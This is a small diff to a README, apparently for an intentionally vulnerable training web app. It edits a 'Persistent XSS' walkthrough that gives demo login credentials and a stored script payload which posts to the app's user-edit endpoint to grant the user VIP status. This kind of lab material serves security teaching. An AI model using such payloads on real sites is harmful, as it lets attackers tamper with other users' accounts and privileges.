@@ -8,7 +8,7 @@ Please note: Maven is required to use this software.
 
 ##Persistent XSS
 
-* Log in as user (username: user, password: user) and go to the **Edit User** dialog
+* Log in as standard user (username: user, password: user) and go to the **Edit User** dialog
 * Copy the following script and paste it to the field **Additional Info**
 * `<script>$.post( "http://localhost:8080/user_edit", { username: "user", password: "user", password2: "user", email: "user@web.de", newUser: "false", vip: "true" } )</script>`
 
